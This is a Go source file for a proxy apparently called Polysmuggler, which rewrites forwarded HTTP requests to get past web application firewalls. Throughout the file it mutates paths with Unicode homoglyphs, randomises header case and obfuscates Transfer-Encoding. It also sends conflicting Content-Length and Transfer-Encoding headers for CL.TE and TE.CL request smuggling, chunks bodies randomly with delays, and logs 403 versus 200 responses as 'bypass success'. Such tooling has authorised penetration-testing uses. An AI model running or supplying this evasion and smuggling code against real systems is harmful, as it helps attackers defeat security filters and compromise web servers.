package proxy

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fa33az/polysmuggler/mutator"
)

type Config struct {
	BindAddr     string
	StaticTarget string // If set, acts as reverse proxy forwarding to this target
	Strategy     mutator.Strategy
	Verbose      bool
}

type Proxy struct {
	cfg     Config
	mutator *mutator.Mutator
	stats   map[string]int
	mu      sync.Mutex
}

func NewProxy(cfg Config) *Proxy {
	return &Proxy{
		cfg:     cfg,
		mutator: mutator.NewMutator(cfg.Strategy),
		stats:   make(map[string]int),
	}
}

func (p *Proxy) Start() error {
	listener, err := net.Listen("tcp", p.cfg.BindAddr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %w", p.cfg.BindAddr, err)
	}
	defer listener.Close()

	log.Printf("[+] Polysmuggler listening on %s", p.cfg.BindAddr)
	if p.cfg.StaticTarget != "" {
		log.Printf("[*] Mode: Reverse Proxy targeting %s", p.cfg.StaticTarget)
	} else {
		log.Printf("[*] Mode: Standard HTTP/Tunnel Proxy")
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("[-] Error accepting connection: %v", err)
			continue
		}
		go p.handleConnection(conn)
	}
}

func (p *Proxy) handleConnection(clientConn net.Conn) {
	defer clientConn.Close()

	reader := bufio.NewReader(clientConn)

	// In standard proxy mode, client might send CONNECT for TLS tunneling
	// Peek/read initial request line to check method
	reqLine, err := reader.Peek(8)
	if err != nil {
		return
	}

	if string(reqLine[:7]) == "CONNECT" {
		p.handleTunnel(clientConn, reader)
		return
	}

	// Read standard HTTP request
	req, err := http.ReadRequest(reader)
	if err != nil {
		if err != io.EOF && p.cfg.Verbose {
			log.Printf("[-] Error reading HTTP request: %v", err)
		}
		return
	}
	defer req.Body.Close()

	// Determine destination target
	var targetURL *url.URL
	if p.cfg.StaticTarget != "" {
		// Reverse proxy mode
		targetURL, err = url.Parse(p.cfg.StaticTarget)
		if err != nil {
			log.Printf("[-] Invalid static target URL: %v", err)
			return
		}
	} else {
		// Standard HTTP proxy mode
		if req.URL.Host == "" {
			// Fallback to Host header
			req.URL.Host = req.Host
			req.URL.Scheme = "http"
		}
		targetURL = req.URL
	}

	// Prepare remote host connection details
	host := targetURL.Host
	if !strings.Contains(host, ":") {
		if targetURL.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	// Dial remote server
	var targetConn net.Conn
	if targetURL.Scheme == "https" {
		targetConn, err = tls.Dial("tcp", host, &tls.Config{
			InsecureSkipVerify: true,
		})
	} else {
		targetConn, err = net.Dial("tcp", host)
	}

	if err != nil {
		log.Printf("[-] Failed to connect to remote %s: %v", host, err)
		sendErrorResponse(clientConn, 502, "Bad Gateway", fmt.Sprintf("Failed to connect to target: %v", err))
		return
	}
	defer targetConn.Close()

	// Read body
	bodyBytes, err := io.ReadAll(req.Body)
	if err != nil {
		log.Printf("[-] Error reading request body: %v", err)
		return
	}

	// Apply mutations and send request
	err = p.forwardMutatedRequest(targetConn, req, bodyBytes, targetURL)
	if err != nil {
		log.Printf("[-] Error forwarding request: %v", err)
		return
	}

	// Read target response and write back to client
	respReader := bufio.NewReader(targetConn)
	resp, err := http.ReadResponse(respReader, nil)
	if err != nil {
		log.Printf("[-] Error reading remote response: %v", err)
		return
	}
	defer resp.Body.Close()

	// Log status for feedback loop
	p.recordFeedback(req.Method, targetURL.Path, resp.StatusCode)

	// Write response headers and body back to client
	err = resp.Write(clientConn)
	if err != nil && p.cfg.Verbose {
		log.Printf("[-] Error writing response to client: %v", err)
	}
}

// forwardMutatedRequest writes mutated request bytes directly to target TCP socket
func (p *Proxy) forwardMutatedRequest(w io.Writer, req *http.Request, body []byte, targetURL *url.URL) error {
	buf := &bytes.Buffer{}

	// 1. Path Mutation (Unicode Homoglyphs)
	path := targetURL.Path
	if targetURL.RawQuery != "" {
		mutatedQuery := p.mutator.TranslateUnicode(targetURL.RawQuery)
		path += "?" + mutatedQuery
	} else if p.mutator.Strat.UnicodeHomoglyph {
		path = p.mutator.TranslateUnicode(path)
	}

	if path == "" {
		path = "/"
	}

	// Write Request Line
	fmt.Fprintf(buf, "%s %s %s\r\n", req.Method, path, req.Proto)

	// 2. Body / Transfer-Encoding logic
	isChunked := len(body) > 0 && (p.cfg.Strategy.SmuggleCLTE || p.cfg.Strategy.SmuggleTECL || p.cfg.Strategy.ChunkedObfuscate)

	// Headers writing loop
	for k, vv := range req.Header {
		// Ignore standard formatting, we will output mutated keys/values
		for _, v := range vv {
			// Skip Host header, content-length, transfer-encoding to format manually
			if strings.ToLower(k) == "host" || strings.ToLower(k) == "content-length" || strings.ToLower(k) == "transfer-encoding" {
				continue
			}
			mutatedKey := p.mutator.RandomCase(k)
			fmt.Fprintf(buf, "%s: %s\r\n", mutatedKey, v)
		}
	}

	// Write Host Header
	mutatedHostKey := p.mutator.RandomCase("Host")
	fmt.Fprintf(buf, "%s: %s\r\n", mutatedHostKey, targetURL.Host)

	// Write Smuggling / Obfuscation Headers
	if isChunked {
		teKey, teVal := p.mutator.ObfuscateTransferEncoding()

		if p.cfg.Strategy.SmuggleCLTE {
			// Write Content-Length first, then Transfer-Encoding
			fmt.Fprintf(buf, "%s: %d\r\n", p.mutator.RandomCase("Content-Length"), len(body))
			fmt.Fprintf(buf, "%s: %s\r\n", teKey, teVal)
		} else if p.cfg.Strategy.SmuggleTECL {
			// Write Transfer-Encoding first, then Content-Length
			fmt.Fprintf(buf, "%s: %s\r\n", teKey, teVal)
			fmt.Fprintf(buf, "%s: %d\r\n", p.mutator.RandomCase("Content-Length"), len(body))
		} else {
			// Just obfuscated Transfer-Encoding
			fmt.Fprintf(buf, "%s: %s\r\n", teKey, teVal)
		}
	} else if len(body) > 0 {
		// Normal Content-Length
		fmt.Fprintf(buf, "%s: %d\r\n", p.mutator.RandomCase("Content-Length"), len(body))
	}

	// End of Headers
	buf.Write([]byte("\r\n"))

	// Write Headers to Socket
	_, err := w.Write(buf.Bytes())
	if err != nil {
		return err
	}

	// Write Body
	if len(body) > 0 {
		if isChunked {
			// Send chunked body
			err = p.writeChunkedBody(w, body)
			if err != nil {
				return err
			}
		} else {
			// Send raw body
			_, err = w.Write(body)
			if err != nil {
				return err
			}
		}
	}

	return nil
}

// writeChunkedBody sends body divided into randomized chunk sizes
func (p *Proxy) writeChunkedBody(w io.Writer, body []byte) error {
	offset := 0
	length := len(body)

	for offset < length {
		// Randomize chunk size between 1 and 64 bytes
		chunkSize := 4 + int(time.Now().UnixNano()%60)
		if offset+chunkSize > length {
			chunkSize = length - offset
		}

		chunkData := body[offset : offset+chunkSize]

		// Write size in hex + CRLF
		_, err := fmt.Fprintf(w, "%x\r\n", chunkSize)
		if err != nil {
			return err
		}

		// Write chunk data + CRLF
		_, err = w.Write(chunkData)
		if err != nil {
			return err
		}
		_, err = w.Write([]byte("\r\n"))
		if err != nil {
			return err
		}

		offset += chunkSize

		// Handle chunk delay
		if p.cfg.Strategy.DelayChunksMs > 0 {
			time.Sleep(time.Duration(p.cfg.Strategy.DelayChunksMs) * time.Millisecond)
		}
	}

	// End of chunked body
	_, err := w.Write([]byte("0\r\n\r\n"))
	return err
}

func (p *Proxy) handleTunnel(clientConn net.Conn, reader *bufio.Reader) {
	// Standard CONNECT tunnel - proxy cannot easily mutate TLS contents without CA certs
	// Extract the host details
	line, err := reader.ReadString('\n')
	if err != nil {
		return
	}
	parts := strings.Split(line, " ")
	if len(parts) < 2 {
		return
	}
	host := parts[1]

	destConn, err := net.Dial("tcp", host)
	if err != nil {
		log.Printf("[-] Failed to tunnel to %s: %v", host, err)
		sendErrorResponse(clientConn, 502, "Bad Gateway", err.Error())
		return
	}
	defer destConn.Close()

	// Send 200 Connection Established back to client
	clientConn.Write([]byte("HTTP/1.1 200 Connection Established\r\n\r\n"))

	// Tunnel raw bytes bidirectional
	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		io.Copy(destConn, clientConn)
		wg.Done()
	}()
	go func() {
		io.Copy(clientConn, destConn)
		wg.Done()
	}()
	wg.Wait()
}

func (p *Proxy) recordFeedback(method, path string, status int) {
	p.mu.Lock()
	defer p.mu.Unlock()

	statusStr := strconv.Itoa(status)
	p.stats[statusStr]++

	if p.cfg.Verbose {
		log.Printf("[*] FeedBack: %s %s -> Status %d (Total %d responses: %v)", method, path, status, p.stats[statusStr], p.stats)
	} else if status == 200 {
		log.Printf("[+] Bypass success (Status 200) for target endpoint: %s", path)
	} else if status == 403 {
		log.Printf("[-] Request Blocked (Status 403) by WAF for endpoint: %s", path)
	}
}

func sendErrorResponse(w io.Writer, code int, statusText, details string) {
	resp := fmt.Sprintf("HTTP/1.1 %d %s\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\nError: %s\nDetails: %s\n",
		code, statusText, statusText, details)
	w.Write([]byte(resp))
}
